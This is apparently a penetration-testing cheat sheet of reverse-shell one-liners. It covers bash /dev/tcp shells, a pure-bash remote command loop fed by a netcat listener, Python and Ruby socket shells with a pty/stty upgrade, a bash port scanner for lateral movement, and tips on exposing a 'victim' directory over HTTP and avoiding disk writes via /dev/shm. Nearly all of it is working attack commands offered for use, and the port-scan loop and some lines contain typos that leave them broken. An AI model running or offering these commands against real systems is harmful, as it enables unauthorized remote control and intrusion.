# Shells

>  A shell is software/protocol that provides an interface for an CLI to the underlying OS


### BASH

######  REMEMBER IF YOU NEVER WANT TO TOUCH DISK ON THE REMOTE HOST ALWAYS USE /dev/shm (SHARED MEMORY) , AS THIS IS TREATED AS VIRTUAL MEMORY AND MOUNTED AS tmpfs NOTHING IS STORED OR WRITTEN TO DISK. THE BONUS IS THAT YOU WILL SEE A PERFORMANCE INCREASE TOO.
<hr>
Bash as it stands, is a (the most popular) shell on its own, but can also provide some really neat tricks to allow for all kinds of shell related goodness, such as a reverse shell.

#### Bash reverse shell

* Spawn a reverse shell back to your server using /dev/tcp or /dev/udp
    > bash -i >& /dev/tcp/\<yourserver>/8080 0>&1 
    
		Example:  bash -i >& /dev/tcp/10.10.10.1/8080 0>&1
    <br>
    > or bassh -c bash -i >& /dev/tcp/\<yourserver>/8080 0>&1 
    
		Example: bash -i >& /dev/tcp/yourserver.com/443 0>&1
    <br>

#### Bash /dev/tcp or /dev/udp port scanner

 * Using /dev/tcp or /dev/udp to do a port scan, useful for checking connected hosts for laterial movement
    * Example looking for open web connection on a remote host when no port scammer is available:
        <br> 

			 for port in {21.\.443}; do echo -e "GET / HTTP/1.0\n\n" > bash -i >& /dev/tcp/\<server>/\$port 0>&1 && echo -e "\n[Port $port is UP]\n"; done

<br>
 
 * Of course you could also always put this in a shell script, as originally found on oreilly.com/pub/h/5299 and small mod by Luke Bonanomi [bash port scanner](https://github.com/rupert0/shell/blob/master/bash/portscanner)
<br>

    	#!/usr/bin/env bash
    	
	    for port in \$(yes scan | head -$3)
		    do
		    (( start++ ))
		    if [[ -n $(echo '' > /dev/$2/$1/$start && echo "up") ]];
			    then
				echo "Port $start" >> scan;
		    fi
	    done;
	    clear;
	    cat scan;
	    rm scan;

			> ./portscan.sh 127.0.0.1 tcp 122 2> /dev/null
<br>

 * Another useful reverse shell we could do with bash and /dev/tcp or /dev/udp is create a connection that basically mimics netcat but done purley in bash, start off with a netcat listener on your server:
	> nc -lvvvnp 8001
	
*	Then on the remote server we use some bash-fu
	> exec 5<>/dev/tcp/\<yourserver>/8001 && while read line 0<&5; do $line 2>&5 >\&5; done
	
* This will allow everything you type on your server to be executed on the remote server and the output is conveniently piped back to you 
<hr>

### Python
Of course the reverse shell options are always going to be dependent on the installed scripting languages, but almost all systems have python installed. That is great news as it allows us to do a few handy tricks from a reverse shell to setting the stty to act and feel like a full shell with tab complete and the works.

#### Python reverse shell

 - Spawn a reverse shell back to your server using python built in libraries.
 

	> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\<yourserver>",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
- Once you have the shell (with sh or any dumb shell) you can then escalate if you so wish to bash or the full shell of your choice with :

	    $ python -c "import pty;pty.spawn('/bin/bash')"
	    
- Then background the shell and set stty and then foreground again for a complete fully functional shell, to background the shell use Ctrl Z and type :
 
		$ stty raw -echo
		
- Then foreground again with fg. I have on occasion had to type reset as well.
- Advantages to this is of course the ability to run things like ssh and vim have tab-complete, job control and history to mention a few.

#### When all else fails
- And you can't get a shell, you could simply create a web interface to the current directory, using :

	    python -m SimpleHTTPServer 8001 
- or for python3 use :  

	    python3 -m http.server 8001

- Then point your browser at the victim server on port 8001, or use a port that would always be allowed through the firewall like port 80 or 443 or 21, 25 ,110 etc. This assumes that the victims machine is either external facing  or you are sitting internally.

<hr>

### Ruby
If ruby is installed instead of python or you prefer ruby, then the reverse shell is just as easy and you can follow the steps above to escalate to full shell :

> ruby -rsocket -e"f=TCPSocket.open('10.0.0.1',8001).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)"

- If for some reason you can't get the /bin/sh or any other shell, you could use IO to execute commands :

> ruby -rsocket -e "exit if fork;c=TCPSocket.new('10.0.0.1',8001);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"

- As with python if all else fails and you can't get a shell serve the current directory over a web interface :

	    ruby -run -e httpd . -p 8001

<hr>

### PHP


 
